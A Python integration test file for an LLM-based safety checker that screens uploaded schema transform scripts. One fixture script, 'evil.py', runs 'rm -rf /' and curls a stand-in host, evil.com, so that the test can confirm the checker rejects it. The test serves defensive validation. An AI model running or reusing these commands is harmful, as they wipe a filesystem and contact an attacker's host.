"""Schema 脚本 LLM 安全校验真实 LLM 集成测试。

需要真实 ZHIPUAI_API_KEY / LLM_API_KEY，CI 默认跳过（external marker）。
本地运行：export ZHIPUAI_API_KEY=... && uv run pytest tests/integration/test_schema_script_verify_external.py -v
"""

from __future__ import annotations

import json
import os
from io import BytesIO

import pytest
from httpx import ASGITransport, AsyncClient
from sqlalchemy import create_engine
from sqlalchemy.orm import Session
from sqlalchemy.pool import StaticPool

from infra.llm import reset_llm_client
from infra.mysql import get_session
from infra.s3 import StoredObject
from main import app
from script.init_schema_management import initialize_schema_management

pytestmark = pytest.mark.external


class FakeBody(BytesIO):
    def iter_chunks(self, chunk_size: int):
        while chunk := self.read(chunk_size):
            yield chunk


class FakeS3Storage:
    def __init__(self) -> None:
        self.objects: dict[tuple[str, str], bytes] = {}
        self.bucket = "test-schema-scripts"

    def put_bytes(self, object_key: str, data: bytes, content_type: str) -> StoredObject:
        self.objects[(self.bucket, object_key)] = data
        return StoredObject(bucket=self.bucket, object_key=object_key, etag="test-etag")

    def get_object(self, bucket: str, object_key: str) -> FakeBody:
        return FakeBody(self.objects[(bucket, object_key)])

    def delete_object(self, bucket: str, object_key: str) -> None:
        self.objects.pop((bucket, object_key), None)


@pytest.fixture
def schema_api(monkeypatch):
    if not (os.getenv("ZHIPUAI_API_KEY") or os.getenv("LLM_API_KEY")):
        pytest.skip("未配置 ZHIPUAI_API_KEY / LLM_API_KEY，跳过真实 LLM 测试")
    reset_llm_client()
    engine = create_engine(
        "sqlite://",
        connect_args={"check_same_thread": False},
        poolclass=StaticPool,
    )
    initialize_schema_management(engine)
    storage = FakeS3Storage()

    def override_session():
        with Session(engine) as session:
            yield session

    app.dependency_overrides[get_session] = override_session
    monkeypatch.setattr("service.schema_management.get_schema_s3_storage", lambda: storage)
    yield engine, storage
    app.dependency_overrides.pop(get_session, None)
    reset_llm_client()
    engine.dispose()


async def _drain_sse(response) -> list[dict]:
    events: list[dict] = []
    async for line in response.aiter_lines():
        line = line.strip()
        if not line.startswith("data: "):
            continue
        events.append(json.loads(line[len("data: ") :]))
    return events


async def _list_expert(client: AsyncClient) -> dict:
    listing = await client.get(
        "/api/v1/schema-management/schemas",
        params={"kind": "entity", "pageSize": 100, "includeDetails": True},
    )
    return next(item for item in listing.json()["data"]["items"] if item["name"] == "Expert")


@pytest.mark.asyncio
async def test_verify_real_llm_benign_script(schema_api) -> None:
    """明显安全的纯 transform 脚本，真实 LLM 应判为安全并保存。"""
    async with AsyncClient(transport=ASGITransport(app=app), base_url="http://test") as client:
        expert = await _list_expert(client)
        async with client.stream(
            "POST",
            f"/api/v1/schema-management/schemas/{expert['id']}/script/verify",
            headers={"X-User-Id": "schema-admin"},
            files={
                "script": (
                    "expert.py",
                    b"def transform(row):\n    return {k: v for k, v in row.items()}\n",
                    "text/x-python",
                )
            },
        ) as response:
            assert response.status_code == 200
            events = await _drain_sse(response)

    types = [e["type"] for e in events]
    assert "success" in types, f"期望安全通过，实际事件: {events}"


@pytest.mark.asyncio
async def test_verify_real_llm_dangerous_script(schema_api) -> None:
    """含 os.system 的危险脚本，真实 LLM 应判为不安全。"""
    async with AsyncClient(transport=ASGITransport(app=app), base_url="http://test") as client:
        expert = await _list_expert(client)
        async with client.stream(
            "POST",
            f"/api/v1/schema-management/schemas/{expert['id']}/script/verify",
            headers={"X-User-Id": "schema-admin"},
            files={
                "script": (
                    "evil.py",
                    b"import os\nimport subprocess\n\ndef transform(row):\n    os.system('rm -rf /')\n    subprocess.Popen(['curl', 'http://evil.com'])\n    return row\n",
                    "text/x-python",
                )
            },
        ) as response:
            assert response.status_code == 200
            events = await _drain_sse(response)

    types = [e["type"] for e in events]
    assert types[-1] == "error", f"期望危险脚本被拒，实际事件: {events}"
    assert "success" not in types
